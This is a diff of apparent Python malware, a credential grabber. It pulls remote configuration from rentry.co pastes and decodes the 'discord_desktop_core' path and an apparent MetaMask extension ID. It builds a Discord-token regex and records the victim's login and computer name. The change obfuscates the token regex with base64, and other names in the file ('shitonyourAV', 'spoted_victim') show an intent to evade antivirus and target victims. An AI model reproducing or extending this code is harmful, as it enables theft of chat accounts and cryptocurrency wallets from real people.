@@ -51,7 +51,7 @@ hwkishst_secret = "https://rentry.co/nxuf8/raw"
 thisst = requests.get(hwkishst_secret)
 stspecial = thisst.text
 
-wattis_secret = "https://rentry.co/fwi67/raw"
+wattis_secret = "https://rentry.co/8n7ee/raw"
 fckyesz = requests.get(wattis_secret)
 maybycool = fckyesz.text
 
@@ -64,10 +64,6 @@ alink = requests.get(justalink)
 justafcklink = alink.text
 
 
-hwkishmyregex_secret = "https://rentry.co/shitonyourAV/raw"
-reg_req = requests.get(hwkishmyregex_secret)
-regx_net = r"[\w-]{24}\." + reg_req.text
-
 netwrd = "https://rentry.co/fgsqi/raw"
 myboyzzz = requests.get(netwrd)
 ntwrk = myboyzzz.text
@@ -79,6 +75,8 @@ justatermlil = justaterm.lower()
 coresecretname = base64.b64decode(b'ZGlzY29yZF9kZXNrdG9wX2NvcmU=').decode()
 extension_id = f'{base64.b64decode("bmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4=")}'.replace("b'", "").replace("'", "")
 inp  = str(extension_id)
+
+regx_net = r"[\w-]{24}\." + base64.b64decode(b'W1x3LV17Nn1cLltcdy1dezI1LDExMH0=').decode()
 
 imthebestdev = os.getlogin()
 spoted_victim = os.getenv("COMPUTERNAME")
